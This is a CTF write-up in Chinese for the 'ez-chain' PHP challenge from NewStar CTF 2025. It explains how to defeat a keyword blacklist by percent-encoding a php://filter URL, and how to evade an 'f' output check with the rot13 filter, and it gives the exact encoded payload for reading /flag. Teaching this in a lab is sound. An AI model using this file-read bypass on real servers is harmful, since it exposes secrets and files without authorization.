---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

# ez-chain

> 碎碎念：本来想考filter_chain所以才取这个名字，大改之后其实不需要多个过滤器组成chain来着...

```php
<?php
header('Content-Type: text/html; charset=utf-8');
function filter($file) {
    $waf = array('/',':','php','base64','data','zip','rar','filter','flag');
    foreach ($waf as $waf_word) {
        if (stripos($file, $waf_word) !== false) {
            echo "waf:".$waf_word;
            return false;
        }
    }
    return true;
}

function filter_output($data) {
    $waf = array('f');
    foreach ($waf as $waf_word) {
        if (stripos($data, $waf_word) !== false) {
            echo "waf:".$waf_word;
            return false;
        }
    }
    while (true) {
        $decoded = base64_decode($data, true);
        if ($decoded === false || $decoded === $data) {
            break;
        }
        $data = $decoded;
    }
    foreach ($waf as $waf_word) {
        if (stripos($data, $waf_word) !== false) {
            echo "waf:".$waf_word;
            return false;
        }
    }
    return true;
}

if (isset($_GET['file'])) {
    $file = $_GET['file'];
    if (filter($file) !== true) {
        die();
    }
    $file = urldecode($file);
    $data = file_get_contents($file);
    if (filter_output($data) !== true) {
        die();
    }
    echo $data;
}
highlight_file(__FILE__);

?>
```

通读一下本题的代码逻辑：输入一个文件名，然后读取文件。

重点：`filter()` 在对 **原始 GET 参数**（还没 `urldecode`）做黑名单检测；而在 `file_get_contents` 之后，`filter_output()` 会检验并对输出做 **重复的 base64_decode**。

搜索一下被过滤掉的关键词：filter php，可以知道本题考的是PHP的伪协议。

题目里 `filter()` 检测了一堆 **关键词**（`php`、`filter`、`base64`、`/`、`:`、`flag` 等），这些都是字母或符号，普通的 URL 编码（浏览器/工具自动的）不会把字母全部编码，所以它们仍会在 `filter()` 的原始字符串里出现并被匹配到。如果我们把整条伪协议（包括字母）**逐字符变为 `%hh`**（例如 `p`->`%70`，`h`->`%68`，`p`->`%70`），那么原始 GET 参数里就不再包含 `php` / `filter` / `base64` / `:` / `/` 等可检测的文本，就能绕过 `filter()`。服务器随后执行 `urldecode()`（一次），把 `%70%68%70%3A%2F%2F...` 还原成 `php://filter/...`，`file_get_contents` 正常工作。

但是，我们知道flag{}一直都包含f，而且base64的包装也没用（会被反复解开），那怎么办？

聪明的小朋友们应该会发现，平台的动态 flag 的内部其实是一个UUID，**它的字符范围永远是 0-f (16进制)**

而 php filter 里面有一个包装器是**rot13**。

0-f 和 flag 经过 rot13 之后就不存在 f 了。所以可以直接绕过过滤。

所以payload就是：

```plaintext
php://filter/string.rot13/resource=/flag
```

编码后：

```plaintext
%70%68%70%3a%2f%2f%66%69%6c%74%65%72%2f%73%74%72%69%6e%67%2e%72%6f%74%31%33%2f%72%65%73%6f%75%72%63%65%3d%2f%66%6c%61%67
```

得到的 flag 再次 rot13 即可
